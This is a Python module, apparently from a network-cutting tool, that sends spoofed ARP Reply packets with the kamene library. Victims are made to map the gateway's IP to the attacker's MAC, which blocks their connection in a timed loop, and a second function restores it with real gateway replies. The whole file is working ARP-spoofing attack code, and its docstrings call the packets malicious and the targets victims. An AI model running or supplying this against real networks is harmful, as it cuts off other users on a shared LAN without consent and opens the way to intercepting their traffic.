"""block module

This module exports:
  - send_arp_packet         function that sends a malicious ARP Reply
  - block                   function that blocks the targets' connection
  - restore_connection      function that restores a previously blocked connection
"""
from logger import create_logger
from loading_animation import animate
from terminal_control import Color
import time
from kamene.layers.l2 import Ether, ARP
from kamene.sendrecv import sendp
# noinspection PyUnresolvedReferences
from kamene import route

log = create_logger(__name__)


def send_arp_packet(interface, my_mac, gateway_ip, target_ip, target_mac):
    """Send an ARP Reply (Opcode 2) to the victim in order to associate our MAC address with the gateway IP

    :param interface: The interface to send packets from
    :param my_mac: Our hardware address
    :param gateway_ip: The router/modem IP address
    :param target_ip: The victim's IP address
    :param target_mac: The victim's hardware address
    """
    ether = Ether()
    ether.src = my_mac
    ether.dst = target_mac
    log.debug(f'Ether packet created: {ether!r}')

    arp = ARP()
    arp.op = ARP.is_at
    arp.psrc = gateway_ip
    arp.hwsrc = my_mac
    arp.pdst = target_ip
    arp.hwdst = target_mac
    log.debug(f'ARP packet created: {arp!r}')

    packet = ether / arp
    log.debug(f'Ether/ARP packet created: {packet!r}')

    log.debug('Sending Ether/ARP packet at layer 2')
    sendp(packet, iface=interface, verbose=False)


def block(targets, addresses, packets):
    """Send malicious ARP packets to block the connection

    :param targets: List of target hosts
    :param addresses: An Addresses object
    :param packets: Packets to send per minute
    """
    log.debug(f'Blocking {targets}')
    while True:
        for t in targets:
            send_arp_packet(addresses.interface.name, addresses.interface.mac, addresses.gateway.ip, t.ip, t.mac)
        time.sleep(60 / packets)


@animate(msg=f'{Color.B_YELLOW}Restaurando conexión, espera un momento...')
def restore_connection(targets, addresses, seconds=10, delay=0.5):
    """Send legitimate ARP packets to restore the connection

    :param targets: List of target hosts
    :param addresses: An Addresses object
    :param seconds: Time (in seconds) to restore the connection
    :param delay: Delay between packets sent. Default: 0.5
    """
    log.debug(f'Restoring connection with {targets}')
    for i in range(int(seconds / delay)):
        for t in targets:
            send_arp_packet(addresses.interface.name, addresses.gateway.mac, addresses.gateway.ip, t.ip, t.mac)
        time.sleep(delay)
    log.debug('Connection restored')
